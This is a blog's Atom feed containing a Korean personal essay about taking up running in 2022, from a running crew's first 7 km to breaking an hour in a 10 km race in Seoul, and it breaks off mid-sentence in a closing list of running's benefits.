<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://chanmi-lee.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://chanmi-lee.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-12-31T01:53:24+00:00</updated><id>https://chanmi-lee.github.io/feed.xml</id><title type="html">Chanmi Lee</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">Why I Run (feat. 내가 달리기를 좋아하는 이유)</title><link href="https://chanmi-lee.github.io/articles/2022-12/why-I-run/" rel="alternate" type="text/html" title="Why I Run (feat. 내가 달리기를 좋아하는 이유)"/><published>2022-12-23T00:00:00+00:00</published><updated>2022-12-23T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2022-12/why-I-run</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2022-12/why-I-run/"><![CDATA[<hr/> <h2 id="covid--wfh">Covid &amp; WFH</h2> <p>2022년 2월, 갑작스럽게 우리의 일상을 침범해온 코로나. 2022년은 이전에 경험해보지 못한 비일상적인 삶이 일상이 되어버린 한 해로 요약할 수 있었다. 사회적 거리두기와 제한된 모임으로 인해 시작된 리모트 근무와 WFH (Work From Home).</p> <blockquote> <p>“건강하게 지내고 곧 만나요-“</p> </blockquote> <p>새로운 회사로 이직한 지 반 년도 채 지나지 않아 언제가 될 지 모르는 인사를 나누던 때가 엊그제 같은데 벌써 한 해가 훌쩍 지났다. 학교 다닐 때보다 회사생활을 하게 되는 이 시점에, (백수가 아니고서야) 더욱 더 오랜 시간을 집에서 머물게 될 것이라고는 한 번도 상상해본 적은 없었다.</p> <p>덕분에 가족들과 더 많은 시간을 보내기도 했지만, 꽤나 자주 보던 친구들과의 평화롭던 일상을 누리기에는 제약이 많았던 시간이기도 했다. 마스크와 습관적 손씻기를 통해 피해갈 수 있으려나 싶었던 코로나의 위협으로부터 결국 피하지 못해 된통 당했던 때도 있었다. 새로 입사한 팀원의 온보딩 기간 동안만 일시적으로 오피스에 출근하여 대면 근무를 하던 때에 드디어 걸려버렸던 것이다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/covid-480.webp 480w,/assets/img/posts/covid-800.webp 800w,/assets/img/posts/covid-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/covid.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <hr/> <h2 id="why-i-run">Why I Run?</h2> <swiper-container keyboard="true" navigation="true" pagination="true" pagination-clickable="true" pagination-dynamic-bullets="true" rewind="true"> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/log4workout-480.webp 480w,/assets/img/posts/log4workout-800.webp 800w,/assets/img/posts/log4workout-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/log4workout.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/log4workout-eachmonth-480.webp 480w,/assets/img/posts/log4workout-eachmonth-800.webp 800w,/assets/img/posts/log4workout-eachmonth-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/log4workout-eachmonth.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/log4workout-time-480.webp 480w,/assets/img/posts/log4workout-time-800.webp 800w,/assets/img/posts/log4workout-time-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/log4workout-time.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> </swiper-container> <p>백신패스 만료와 함께 실내 운동이 불가해지자, 근질거리는 몸을 참을 수 없었다. 집에서 아무리 실내사이클을 돌려봐도, 그 동안 PT와 요가로 혹독하게 단련시킨 몸 탓인지 별 다른 자극이 오지 않는 지경에 이르렀다.</p> <p>하지만 그렇다고 실외 운동을 하자니, 바야흐로 한 겨울인 시점. 더더군다나 나 홀로 운동하기엔 쉽사리 의지가 생기지 않는 강추위가 맞서고 있었다. 어쩔 수 없이(?) 궁여지책으로 동네 러닝 크루에 게스트로 참가하게 되었다.</p> <hr/> <h3 id="첫-술에-배부르다-못해-체할-것-같던-7km">첫 술에 배부르다 못해 체할 것 같던 7Km</h3> <p>2022년 2월, 영하의 추위를 뚫고 처음 참가한 러닝 크루에서의 게스트런에서 무려 7km를 뛰었다. 하필 게스트가 나 혼자 뿐이었던 상황이었기 때문일까… 헬스장 트레이드밀 위에서만 인터벌로 뛰어본게 전부인 나였지만, 생판 처음 보는 사람들과 발맞춰 천천히 뛰다보니 한 번도 안 쉬고 7km를 뛰긴 뛰었다.</p> <p>인터벌로 걷뛰걷뛰 할 때는 중간에 너무 숨이 차면 잠깐 쉬어갈 수 있었다. 그치만 러닝크루에서의 첫 7km는 달랐다. 처음 뛸 때는 정말 말 그대로 ‘죽는줄’ 알았는데, 땅은 안그래도 무거운 발을 아래로 잡아당기고, 턱끝까지 차오르는 숨에 목은 따끔따끔 아팠다. 그럼에도 지금 한걸음, 이 한걸음만, 하면서 뛰다 보면 어느새 나도 모르게 발이 움직이고 있는 듯한 관성의 축복이 첫 러닝엔 찾아 오…진 않았다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/first-running-480.webp 480w,/assets/img/posts/first-running-800.webp 800w,/assets/img/posts/first-running-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/first-running.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>그럼에도 불구하고 <code class="language-plaintext highlighter-rouge">"함께하면 조금 더 멀리 갈 수 있다"</code> 의 명제를 깨닫게 된 순간으로 기억하게 되었다. 나 혼자였더라면, 분명 7km를 못 채우고 중간에 분명 멈추었을 것이다. 함께 달리니 느리지만 완주해냈고 이 때부터 나는 새로운 목표를 세우고 달리기 시작했다.</p> <hr/> <h3 id="초심자의-행운">초심자의 행운</h3> <p>처음인데 7km를 뛰어버린 나는 그렇게 정식 크루원이 되었다. 7km를 7분 페이스로 뛰었으니, 더 짧은 거리는 더 빠르게 뛸 수 있을 것이라는 크루원들의 조언을 따라 차근차근 페이스를 개선해보기로 했다.</p> <swiper-container keyboard="true" navigation="true" pagination="true" pagination-clickable="true" pagination-dynamic-bullets="true" rewind="true"> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/second-480.webp 480w,/assets/img/posts/second-800.webp 800w,/assets/img/posts/second-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/second.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/third-run-480.webp 480w,/assets/img/posts/third-run-800.webp 800w,/assets/img/posts/third-run-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/third-run.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/feb-last-480.webp 480w,/assets/img/posts/feb-last-800.webp 800w,/assets/img/posts/feb-last-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/feb-last.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> </swiper-container> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/second-run-480.webp 480w,/assets/img/posts/second-run-800.webp 800w,/assets/img/posts/second-run-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/second-run.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>정기적으로 크루런에 나가 3-5km씩 달리다보니 한 달만에 페이스를 6분 초반까지 당길 수 있었다. 러닝은 처음이지만, 아마도 요가나 웨이트 등 기초 체력을 다지기 위한 운동과 아예 멀리 지내지 않았던 덕분이라고 생각한다.</p> <hr/> <p>###</p> <p>단기간에 눈에 띄게 페이스가 빨라지니, 자연스레 <code class="language-plaintext highlighter-rouge">더 먼 거리도 더 빠른 페이스로 달리고 싶은 욕심</code>이 생기기 시작했다. 동시에 매 번 같은 코스만 달리기보단, 다양한 곳의 풍경을 감상하며 달리는 재미도 알게 되었다. 오랜 기간 나의 고향이었던 송파구는 이러한 점에서 달리기에 최적인 곳이었다.</p> <p>우선, 다른 곳보다 평지 비율이 매우 높다. 언덕이 거의 없고 도로도 넓고 석촌호수와 올림픽공원, 한강 공원 등 어디든 달릴 공간이 많은 곳이라는 것을 달리고 나서야 제대로 실감했다.</p> <p>또한 계절의 변화를 시시때때로 느끼기에 적합하다. 한겨울에 달리기 시작했을 때는, 너무 춥고 아직 달리기에 적응이 안되었던지라 자꾸 가빠지는 호흡과 혼미해지는 정신을 붙잡기도 쉽지 않았다. 그러다 조금씩 호흡이 덜 가빠지니 주변 풍경이 보이기 시작했다.</p> <swiper-container keyboard="true" navigation="true" pagination="true" pagination-clickable="true" pagination-dynamic-bullets="true" rewind="true"> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/run-lake-480.webp 480w,/assets/img/posts/run-lake-800.webp 800w,/assets/img/posts/run-lake-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/run-lake.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/run-park-480.webp 480w,/assets/img/posts/run-park-800.webp 800w,/assets/img/posts/run-park-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/run-park.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/march-run-480.webp 480w,/assets/img/posts/march-run-800.webp 800w,/assets/img/posts/march-run-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/march-run.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/covid-run-480.webp 480w,/assets/img/posts/covid-run-800.webp 800w,/assets/img/posts/covid-run-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/covid-run.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> </swiper-container> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/hanriver-run-480.webp 480w,/assets/img/posts/hanriver-run-800.webp 800w,/assets/img/posts/hanriver-run-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/hanriver-run.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/hanriver-run2-480.webp 480w,/assets/img/posts/hanriver-run2-800.webp 800w,/assets/img/posts/hanriver-run2-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/hanriver-run2.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/hanriver-run3-480.webp 480w,/assets/img/posts/hanriver-run3-800.webp 800w,/assets/img/posts/hanriver-run3-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/hanriver-run3.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>봄에는 여기저기 벚꽃이 흐드러지게 피어나 <code class="language-plaintext highlighter-rouge">벚꽃런</code>을 마음껏 뛰었다. 지구의 날에는 달리면서 쓰레기를 줍는 <code class="language-plaintext highlighter-rouge">플로깅 런</code>에도 참여해보았다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/april-run-480.webp 480w,/assets/img/posts/april-run-800.webp 800w,/assets/img/posts/april-run-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/april-run.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/april-run-cherryblossom-480.webp 480w,/assets/img/posts/april-run-cherryblossom-800.webp 800w,/assets/img/posts/april-run-cherryblossom-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/april-run-cherryblossom.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/crew-run-480.webp 480w,/assets/img/posts/crew-run-800.webp 800w,/assets/img/posts/crew-run-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/crew-run.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <hr/> <h3 id="추위보다-무서운-한여름의-불볕더위">추위보다 무서운 한여름의 불볕더위</h3> <p>나름 꾸준히 달리다보니 5km 남짓한 거리가 약간 시시하게 느껴지는 순간이 찾아왔다. 동시에 <code class="language-plaintext highlighter-rouge">어디까지가 나의 한계일까?</code> 라는 근거있는 무모한 생각과 함게 호기심이 생겼다.</p> <p>보통 달리기 대회는 봄 혹은 가을에 열린다. 달리 이야기하면, 여름과 겨울은 달리기 힘든 시기라고 반대로 역추적 할 수 있다. 그러나 처음 여름을 경험하는 런린이인 나는 이 말의 뜻을 제대로 경험하기도 전에 일단 대회를 등록해버리게 되었다.</p> <p>한겨울은 그래도 꽁꽁 싸매고 달리면 몸이 데워지면서 덜 춥게 뛰는 것이 가능하다. 그러나 한여름은 달랐다. 집을 나서자마자 땀이 나기 시작하고 숨은 왜 이렇게 안쉬어지고 온 몸이 물에 젖은 솜마냥 무거운지. 땀이 범벅인 상태로 뛰고나니, 차라리 해가 없는 때인 동틀녁 즈음인 이른 새벽이 그나마 하루 중에 가장 시원하다는 것을 깨닫고 생전 일어난 적이 없던 5시에 알람을 맞추기 시작했다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/may-run-480.webp 480w,/assets/img/posts/may-run-800.webp 800w,/assets/img/posts/may-run-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/may-run.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/may-run2-480.webp 480w,/assets/img/posts/may-run2-800.webp 800w,/assets/img/posts/may-run2-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/may-run2.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>여름 제주 여행을 계획한다면, 한라산 등반이 꽤나 좋은 피서가 될 수 있다. 해발 1,947m 의 고지대인 덕분에 땅에 붙어있는 것보다 시원했다 ㅋㅋ</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/mountain-hanra-480.webp 480w,/assets/img/posts/mountain-hanra-800.webp 800w,/assets/img/posts/mountain-hanra-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/mountain-hanra.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/mountain-480.webp 480w,/assets/img/posts/mountain-800.webp 800w,/assets/img/posts/mountain-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/mountain.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <hr/> <h3 id="if-you-want-to-go-fast-go-alone-if-you-want-to-far-go-together">If you want to go fast, go alone. If you want to far, go together.</h3> <p>더위는 가실 줄 모르게 더 더워지는 동시에 일단 등록해버린 대회 일자는 가까워고 있었다. 10km는 아직 뛰어본 적이 없었을 뿐더러, 1자리 수가 아닌 2자리 수의 부담감이 뛰어보기 전에는 절대 사라지지 않을 것 같았다.</p> <p>회사에서의 3-6-9 법칙처럼, 달리기도 이상하게 5km를 달릴 때는 3km 전후 구간에서 멈추고 싶은 생각을 이겨내기가 쉽지 않았고 10km를 뛰려니 7-8km 사이 구간에서 ‘이만하면 되었다’는 생각으로 자꾸 멈추게 되었다. 이대로면 처음 나가는 10km 대회에서도 한 번도 쉬지 않고 달리기는 커녕, 스스로 타협하고 잠시 멈추는 시간을 이겨내지 못할 것만 같았다.</p> <blockquote> <p>멀리 가고 싶으면 함께 가라</p> </blockquote> <p>아프리카 속담에 <code class="language-plaintext highlighter-rouge">"빨리 가려면 혼자 가고, 멀리 가려면 함께 가라"</code> 라는 말이 있다고 한다. 첫 크루런에서 함께한 덕분에 7km를 뛸 수 있던 기억을 되새기며, 첫 10km도 크루원들과 함께 하기로 했다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/first-10k-course-480.webp 480w,/assets/img/posts/first-10k-course-800.webp 800w,/assets/img/posts/first-10k-course-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/first-10k-course.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/first-10k-480.webp 480w,/assets/img/posts/first-10k-800.webp 800w,/assets/img/posts/first-10k-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/first-10k.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>첫 10km 완주의 성취감은 지금까지도 나를 계속 달리게 하는 도파민이자 원동력이다. 그 날 뛰고 나서 먹은 콩나물 국밥은 생전 먹은 콩나물 국밥 중에 으뜸이었다. 궁금하면 한 번 10km 뛰어보고 먹어보시라!</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/first-pr-480.webp 480w,/assets/img/posts/first-pr-800.webp 800w,/assets/img/posts/first-pr-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/first-pr.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/aug-crewrun-480.webp 480w,/assets/img/posts/aug-crewrun-800.webp 800w,/assets/img/posts/aug-crewrun-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/aug-crewrun.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <hr/> <h4 id="첫-마라톤-대회-style-run">첫 마라톤 대회, Style Run</h4> <p>초심의 7km와 동일한 거리인 7km 대회인 Style Run에 참가했다. 올림픽 공원을 바깥에서 한 바퀴 돌면 5km 인데, 롯데월드 타워에서 시작해서 올림픽공원 한 바퀴를 돌고 다시 회귀하는 코스였다. 이어지는 10km 대회를 위한 워밍업 대회 정도로 생각하고 부담없이 뛰었다.</p> <p>10명 남짓 달리는 크루런도 <code class="language-plaintext highlighter-rouge">함께한다</code>는 느낌이 충만하다고 생각했는데, 몇천명 혹은 많게는 만명이 넘는 사람들이 함께 달리는 대회는 차원이 달랐다. 흔히 이야기하는 <code class="language-plaintext highlighter-rouge">대회뽕</code> 이 무엇인지도 알게 되었다. 평소 페이스보다 더 빠른데도 불구하고 달리다보면 덜 힘들게 느껴지는 구간이 찾아오는데, 이를 <code class="language-plaintext highlighter-rouge">러너스하이</code> 라고 한다. 여전히 자주 찾아오는 순간은 아니고, 여전히 숨가쁘고 힘든 고통이 수반될 때가 더 잦지만, 계속 달릴 수 있는 이유는 아마 그 순간과 달리기를 마친 후에만 느낄 수 있는 성취감 덕분이 아닐까?</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/first-7k-record-480.webp 480w,/assets/img/posts/first-7k-record-800.webp 800w,/assets/img/posts/first-7k-record-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/first-7k-record.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/first-running-course-480.webp 480w,/assets/img/posts/first-running-course-800.webp 800w,/assets/img/posts/first-running-course-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/first-running-course.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <hr/> <h3 id="두-번의-10km-대회-그리고-pr">두 번의 10km 대회, 그리고 PR</h3> <p>달리기 가장 좋은 계절인 가을. 차들이 잠시 멈춰선 서울 시내를 달리는 순간이자 지난 1년간의 달리기를 기념하고자 10km 대회를 연달아 달렸다.</p> <p>서울 시청과 광화문으로 이어지는 서울레이스와, 잠실 주경기장부터 잠실대교까지 이어지는 손기정 마라톤 대회에 참여하였다. 1시간 이내로 10km 달리기라는 목표를 세웠는데, 1km를 6분 이내 페이스로 10km 를 달려야만 가능한 기록이기도 했다. 런수저들에게는 쉬운 기록이었겠지만, 보통 체력의 소유자이자 달리는 순간만큼은 타협의 달인인 나에게는 꽤나 어려운 기록이라고 느껴졌다.</p> <swiper-container keyboard="true" navigation="true" pagination="true" pagination-clickable="true" pagination-dynamic-bullets="true" rewind="true"> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/seoul-running-medal-480.webp 480w,/assets/img/posts/seoul-running-medal-800.webp 800w,/assets/img/posts/seoul-running-medal-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/seoul-running-medal.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/seoul-record-480.webp 480w,/assets/img/posts/seoul-record-800.webp 800w,/assets/img/posts/seoul-record-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/seoul-record.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/seoul-running-track-480.webp 480w,/assets/img/posts/seoul-running-track-800.webp 800w,/assets/img/posts/seoul-running-track-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/seoul-running-track.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> </swiper-container> <p>첫 참가했던 10km 대회인 서울 레이스는 42초 초과한 1시간 42초에 완주하여 목표 기록을 달성하지 못했다. 잠시 변명을 하자면, 이 날 달리는 중에 생각보다 비가 많이 와서 <code class="language-plaintext highlighter-rouge">우중런</code> 대비가 충분치 못한 나에게 고난의 레이스였다. 기록을 위해 열심히 뛰었으나 러닝화 앞코가 다 젖고 양말도 축축해질만큼 쏟아지는 빗속에서 아쉬운 마음을 달래며 다음 대회를 기약해야만 했다.</p> <hr/> <p>아쉬움도 잠시, 곧바로 이어지는 2022년 마지막 대회인 손기정 마라톤에서 10km를 다시 달리게 되었다. 이 때도 <code class="language-plaintext highlighter-rouge">혼자보단 함께의 가치</code>를 믿고, 지인 중에 가장 달리기가 빠른 오빠를 페이스메이커로 섭외해서 같이 달리게 되었다. 10km를 30분 후반~40분 초반에 달려버리는 달리기 고수 오빠 덕분에, 가능할까 싶었던 1시간 내 10km 완주하기를 56분대에 뛰어버렸다!</p> <p>이 글에서 또 다시 무한한 감사를 전한다.</p> <swiper-container keyboard="true" navigation="true" pagination="true" pagination-clickable="true" pagination-dynamic-bullets="true" rewind="true"> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/last-running-480.webp 480w,/assets/img/posts/last-running-800.webp 800w,/assets/img/posts/last-running-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/last-running.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/last-running-before-start-480.webp 480w,/assets/img/posts/last-running-before-start-800.webp 800w,/assets/img/posts/last-running-before-start-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/last-running-before-start.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/last-record-480.webp 480w,/assets/img/posts/last-record-800.webp 800w,/assets/img/posts/last-record-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/last-record.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/last-running-record-480.webp 480w,/assets/img/posts/last-running-record-800.webp 800w,/assets/img/posts/last-running-record-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/last-running-record.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> </swiper-container> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/last-running-photo-480.webp 480w,/assets/img/posts/last-running-photo-800.webp 800w,/assets/img/posts/last-running-photo-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/last-running-photo.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <hr/> <h2 id="달리기를-통해-배운-꾸준함의-힘">달리기를 통해 배운 꾸준함의 힘</h2> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/recap-2022-480.webp 480w,/assets/img/posts/recap-2022-800.webp 800w,/assets/img/posts/recap-2022-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/recap-2022.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>백신패스 만료와 함께 어쩔 수 없이 시작한 달리기지만, 2022년 한 해를 돌이켜보면 <code class="language-plaintext highlighter-rouge">달리기로 시작해서 달리기로 끝난 한 해</code>로 기억될 것 같다. 또한 기억은 기록과 함께할 때 더 오래 기억됨을 알기에, 내가 달리는 이유를 달리기가 좋은 이유들로 요약하며 글을 마무리해본다.</p> <ul> <li>Lifestyle <ul> <li>높은 접근성: 특별한 장비나 팀이 필요 없다. 운동화 한 켤레만 있다면 언제 어디서든 시작할 수 있다는 것이 최고의 장점이다.</li> <li>성취감과 자존감: 정해진 거리나 시간을 완주했을 때 느끼는 작은 성취감들이 쌓여 일상의 자신감을 만들어준다.</li> </ul> </li> <li>Mental Health <ul> <li>스트레스 해소: 일정 시간 달리면 뇌에서 엔도르핀과 엔도카나비노이드가 분비되어 우울감과 불안을 완화하며 행복감을 준다. 또한, 스트레스 호르몬인 